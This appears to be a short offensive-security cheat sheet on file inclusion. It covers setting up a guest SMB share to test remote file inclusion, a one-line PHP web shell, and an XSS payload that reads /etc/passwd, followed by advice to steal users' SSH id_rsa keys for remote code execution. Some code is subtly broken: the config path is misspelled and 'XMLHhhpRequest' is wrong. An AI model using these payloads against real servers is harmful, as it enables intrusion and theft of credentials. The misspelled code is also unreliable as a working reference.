# Create an smb share 
- The purpose of this is to check if RFI exists on the parameter or not, especially for windows servers:

```
// Go to /et/sambe/smb.conf and add the following lines at the bottom

[tony]
path = /mnt/tony
writeable = yes
guest ok = yes
guest only = yes
read only = no
directory mode = 0555
force user = nobody

// type this in the terminal to start the service
// sudo service smbd restart

// Then you've got to change the permissions on the newly made mount directory
// sudo chmod 555 /mnt/tony

// change the user/group ownership
// sudo chown -R nobody:nogroup /mnt/tony

// add a random test file
```

- now enter your ip followed by the directory and filename to see if remote file inclusion exists:

```
?param=\\ip\tony\filename
```

- simple php web shell:

```
<?php system($_GET["cmd"]); ?>
```

# Testing for server side xss and using it to leverage LFI
- we can use the following script to test for LFI through server side xss:

```
<script>
x = new XMLHhhpRequest;
x.onload = function() {
	document.write(this.responseText);
};
x.open('GET', 'file:///etc/passwd');
x.send();
</script>
```

- from the /etc/passwd file, we can look for users who might have an id_rsa key in their home directory's ssh folder.
- from there we can download that file to gain remote code execution to that server.


# Extra resources
- Testing for it?

https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/

https://kennel209.gitbooks.io/owasp-testing-guide-v4/en/web_application_security_testing/testing_for_local_file_inclusion.html

https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/

https://brightsec.com/blog/file-inclusion-vulnerabilities/

https://systemweakness.com/testing-for-local-file-inclusion-vulnerability-part-1-1d5dd0bc35d?source=read_next_recirc---------0---------------------73c63150_fd36_40bd_a5cb_04fddf3ada38----------

